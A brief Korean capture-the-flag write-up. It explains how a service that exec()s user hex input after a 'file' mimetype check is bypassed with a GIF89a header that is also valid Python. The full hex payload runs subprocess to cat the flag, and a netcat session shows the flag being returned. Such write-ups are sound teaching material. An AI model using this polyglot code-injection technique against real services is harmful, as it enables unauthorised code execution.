# 풀이 과정 기록

dockerfile 확인 결과 flag파일은 소스코드의 실행 경로인 /app에 같이 존재한다.

소스코드를 확인했을 때 사용자가 hex값을 입력하면
file 명령어를 통해 mimetype을 확인하고
image/로 시작하면 통과하여 사용자의 입력이 실행됨

처음에는 이미지를 통과하기 위해 jpg 파일시그니쳐 ffd8ffd0를 사용하였지만 ascii로 변환되어도 이는 파이썬에서 사용가능한 문자가 아니기 때문에 exec()부분에서 오류가 났다.

다른 이미지 파일 시그니쳐를 찾아보다 gif 파일의 경우 47494638 3961와 같이 ASCII로 변환하여도 GIF89a로 문자열같이 나오기 때문에 파이썬에서도 사용이 가능하다.

이를 이용하여 아래와 같이 파이썬 코드를 작성하고 이를 hex로 변경하게 되면 47494638 39613D31 0A737562 70726F63 6573732E 72756E28 5B276361 74272C20 272E2F66 6C61672E 74787427 5D29 같은 값을 얻을 수 있다.

```py
GIF 시그니쳐=1

# 소스코드에서 subprocess 라이브러리 사용중
subprocess.run(['cat', './flag.txt'])
```

이를 서버에 넣고 실행할 경우 flag를 획득할 수 있다.

```
$ nc 34.170.146.252 29529
hex bytes> 47494638 39613D31 0A737562 70726F63 6573732E 72756E28 5B276361 74272C20 272E2F66 6C61672E 74787427 5D29
Alpaca{M4...ry}
```
